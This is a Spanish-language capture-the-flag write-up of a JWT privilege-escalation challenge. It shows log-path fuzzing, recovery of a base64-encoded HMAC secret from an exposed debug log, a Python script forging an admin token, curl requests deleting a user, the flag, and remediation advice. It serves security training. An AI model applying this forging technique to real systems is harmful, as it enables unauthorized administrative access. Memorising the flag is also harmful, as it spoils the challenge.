# Desafío - Frandawos Corp (HackLab)

**Plataforma:** HackLab (SoftwareSeguro)  
**Edición:** HackLab 2026  
**Categoría:** Tokens / Information Disclosure *(Categoría oficial no especificada en plataforma)*  
**Autor:** adonaissh  
**Herramientas:** `curl`, Python (`hmac`, `hashlib`, `base64`, `json`), Burp Suite, `hashcat`, `ffuf`  

---

## 📌 Enunciado y Contexto del Engagement

> **Cliente:** Frandawos Corp  
> **Alcance:** Aplicación web interna "Panel de Gestión"  
> **Tipo:** Prueba de intrusión grey-box con credenciales de bajo privilegio.
>
> Como parte del plan anual de seguridad, Frandawos Corp solicitó una evaluación de su panel interno. El área de Desarrollo migró recientemente el esquema de autenticación a tokens JWT y, en la reunión de kickoff, el líder técnico afirmó:
>
> *"Con la nueva implementación es imposible que un empleado común acceda a funciones de administración. Los tokens van firmados, así que nadie puede manipular su rol."*
>
> **Credenciales provistas:**
> - Usuario: `Pedro`
> - Contraseña: `PedroPass`
>
> **Objetivo:** Demostrar el impacto escalando de `role: user` a `role: admin` para ejecutar una acción administrativa exclusiva: eliminar la cuenta del usuario Pedro (`POST /delete_user`). Como evidencia del impacto, el sistema entregará la flag tras completar la eliminación.

---

## 🔍 Análisis Inicial y Arquitectura

### 1. Stack Tecnológico y Manejo de Sesión
- **Servidor:** Flask + nginx (`Server: nginx/1.28.3 (Ubuntu)` y trazas internas de Werkzeug en modo desarrollo).
- **Mecanismo de Autenticación:** JSON Web Token (JWT) firmado con algoritmo simétrico **HS256**.
- **Canales de recepción del token:** El backend admite el JWT indistintamente en:
  - Header `Authorization: Bearer <token>`
  - Cookie `jwt_token`
  - Parámetro GET en URL `?token=`
  - Almacenamiento local `localStorage` (leído por el front-end).

### 2. Estructura del Token JWT
Decodificando el JWT entregado tras autenticarse como Pedro:
```json
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "username": "Pedro",
  "role": "user",
  "exp": 1791727716
}
```
El rol de autorización viaja dentro del payload (`"role": "user"`), respaldado por la firma criptográfica simétrica HMAC-SHA256 del servidor.

---

## 🔬 Vectores Descartados y Evaluación Rigurosa

Antes de llegar al vector de explotación real, se evaluaron sistemáticamente todas las superficies de ataque típicas sobre implementaciones JWT y la aplicación:

1. **Bypass de Algoritmo (`alg: none`):**
   - Se enviaron tokens modificados con `"alg": "none"` y firma vacía.
   - **Resultado:** Rechazados tajantemente por el servidor con redirección `302` a `/login`. La validación de firma está estrictamente activa en el backend.
2. **Inyecciones en Encabezado JWT (`kid` / `jwk` injection):**
   - Pruebas de Path Traversal (`../../dev/null`) y SQL Injection en el claim `kid`.
   - **Resultado:** Los claims adicionales en el header son ignorados o provocan rechazo del token.
3. **Fuerza Bruta del Secreto HMAC (Offline Cracking):**
   - Ataques masivos con `hashcat` y scripts Python contra `rockyou.txt` (14.3M+ palabras), reglas de mutación (`best66.rule`), diccionarios alfanuméricos y combinaciones contextuales (nombres de empresa, `ETag`, flags, versiones).
   - **Resultado:** Cero aciertos. El secreto no pertenecía a listas conocidas ni era vulnerable a adivinación básica.
4. **Fuzzing de Parámetros, Headers y SQLi:**
   - Inyecciones booleanas y basadas en tiempo en `/login` y `/api/announcements?id=`.
   - Fuzzing de encabezados administrativos (`X-Debug`, `X-Admin`, `X-Forwarded-For`, etc.).
   - **Resultado:** No hubo puntos vulnerables directos en los endpoints estándar.

La implementación criptográfica de JWT era sólida. Por lo tanto, el fallo radicaba en una **fuga operativa del secreto de firma**.

---

## 🚀 Cadena de Explotación Paso a Paso

### Paso 1: Detección del Hint Operativo
Al revisar las notas y avisos en el dashboard del usuario Pedro, apareció un mensaje de soporte interno:
> *"Los logs del sistema pueden contener detalles técnicos útiles para troubleshooting."*

Esto orientó la investigación hacia endpoints de diagnóstico y logging expuestos.

### Paso 2: Descubrimiento y Acceso a `/logs/debug.log`
Se probó fuzzing de rutas de archivos de log comunes (`app.log`, `access.log`, `system.log`, `debug.log`).

```bash
for f in app.log application.log server.log access.log error.log debug.log system.log flask.log api.log auth.log; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/logs/$f")
  echo "$code /logs/$f"
done
```

- La mayoría de las rutas arrojaron `404 Not Found`.
- **Ruta identificada:** `/logs/debug.log` respondió con `302 Found` redirigiendo a `/login`.
- **Bypass de acceso:** Al interceptar la navegación desde la sesión activa de Pedro en el navegador mediante **Burp Suite** e invocar directamente `/logs/debug.log`, el servidor autorizó la descarga del archivo:
  ```http
  HTTP/1.1 200 OK
  Content-Type: text/plain; charset=utf-8
  Content-Disposition: inline; filename=debug.log
  ```

### Paso 3: Análisis del Log y Evasión de Secretos Señuelo (*Decoys*)
El archivo `debug.log` pesaba ~18 KB y contenía registros de arranque de Flask junto a múltiples **secretos trampa** diseñados para despistar:

```text
[DEBUG] old_signing_key(deprecated, rotated 2025-07)=supersecreto-para-jwt
[DEBUG] SECRET_KEY=changeme123   (test fixture / staging)
[DEBUG] SECRET_KEY=your-256-bit-secret   (example de la doc interna)
INFO:root:[DEBUG] Loaded legacy SECRET_KEY (deprecated, no activa): dev-secret-rotate-me
```

Todos los anteriores estaban explícitamente etiquetados como obsoletos, ejemplos o fixtures.

Más abajo en el log, entre las trazas de inicio de Werkzeug (`WARNING: This is a development server...`), figuraba la línea genuina, sin la palabra clave literal y codificada en Base64:

```text
INFO:root:[DEBUG] active signing material loaded (cfg blob, b64)=RnI0bmQ0dzBzLUpXVC1zMWduLWszeS1RMy0yMDI2
```

Decodificando el valor en base64:

```bash
echo "RnI0bmQ0dzBzLUpXVC1zMWduLWszeS1RMy0yMDI2" | base64 -d
# Fr4nd4w0s-JWT-s1gn-k3y-Q3-2026
```

El secreto activo real para la firma HMAC era:
$$\text{SECRET} = \text{Fr4nd4w0s-JWT-s1gn-k3y-Q3-2026}$$

---

### Paso 4: Forja del Token JWT con Rol de Administrador

Con el secreto en mano, se procedió a crear un nuevo JWT firmado legítimamente donde se modificó el payload cambiando `"role": "user"` por `"role": "admin"`:

```python
import base64
import json
import hmac
import hashlib

def b64url(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

# Secreto recuperado del log
secret = "Fr4nd4w0s-JWT-s1gn-k3y-Q3-2026"

# Header HS256
header_raw = json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':'))
header = b64url(header_raw)

# Payload con elevación de privilegios a admin
payload_raw = json.dumps({
    "username": "Pedro",
    "role": "admin",
    "exp": 1991727716
}, separators=(',', ':'))
payload = b64url(payload_raw)

# Firma HMAC-SHA256
sig_input = f"{header}.{payload}".encode('utf-8')
signature = hmac.new(secret.encode('utf-8'), sig_input, hashlib.sha256).digest()
token = f"{header}.{payload}.{b64url(signature)}"

print("Token Forjado:")
print(token)
```

**Token JWT forjado resultante:**
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlBlZHJvIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxOTkxNzI3NzE2fQ.B1_-RhBJG-4m3xZCrNXuwu-_pVNr3iq8hq7-XDE8OVo
```

---

### Paso 5: Verificación de Privilegios Administrativos
Se probó el token contra el endpoint protegido de la API de administración:

```bash
BASE="https://chl-e8a779e2-88ea-4d25-a588-907e55412559-frandawos-corp.b.softwareseguro.com.ar"
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlBlZHJvIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxOTkxNzI3NzE2fQ.B1_-RhBJG-4m3xZCrNXuwu-_pVNr3iq8hq7-XDE8OVo"

curl -s -H "Authorization: Bearer $TOKEN" "$BASE/api/admin"
```

**Respuesta:**
```json
{
  "username": "Pedro",
  "users": ["Pedro", "Antonio"]
}
```
El servidor validó la firma matemática del token y otorgó acceso como administrador al reconocer el claim `role: admin`.

---

### Paso 6: Ejecución de la Acción Privilegiada y Extracción de la Flag
Cumpliendo el objetivo del engagement, se ejecutó la eliminación de la cuenta de Pedro desde el endpoint exclusivo de administración:

```bash
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"username":"Pedro"}' "$BASE/delete_user"
```

**Respuesta del servidor:**
```json
{
  "flag": true,
  "html": "<!DOCTYPE html>...<div class=\"flag text-start\"><span class=\"lbl\">FLAG: </span>6cfec5e67bf4a63ea6ef55802369da6f</div>..."
}
```

---

## 🏁 Flag

```text
6cfec5e67bf4a63ea6ef55802369da6f
```

---

## 🛡️ Causa Raíz y Recomendaciones

- **Causa Raíz:** Exposición de material criptográfico de firma en registros accesibles (CWE-532 / CWE-200). Aunque la verificación del JWT cumplía los estándares de seguridad, la clave simétrica (`SECRET_KEY`) se cargaba y registraba en archivos de depuración (`debug.log`) servidos en un endpoint expuesto a clientes autenticados.
- **Recomendaciones:**
  - **Eliminar material de firma en logs:** Prohibir terminantemente que el secreto de firma, tokens o variables de configuración crítica se vuelquen al sistema de logging.
  - **Restringir endpoints de logs:** Los archivos de depuración y logs del servidor no deben estar alojados en carpetas públicas ni ser accesibles mediante rutas web como `/logs/*`.
  - **Deshabilitar modo Debug en Producción:** Ejecutar servidores de aplicación con WSGI de producción (como Gunicorn o uWSGI) detrás de nginx, asegurando que el modo debug de Flask/Werkzeug esté desactivado.
  - **Migración a Criptografía Asimétrica (RS256 / ES256):** En esquemas asimétricos, el servidor que valida los tokens únicamente necesita la clave pública. Incluso si un atacante obtuviera acceso a los componentes de lectura, no podría forjar firmas de administración sin la clave privada.
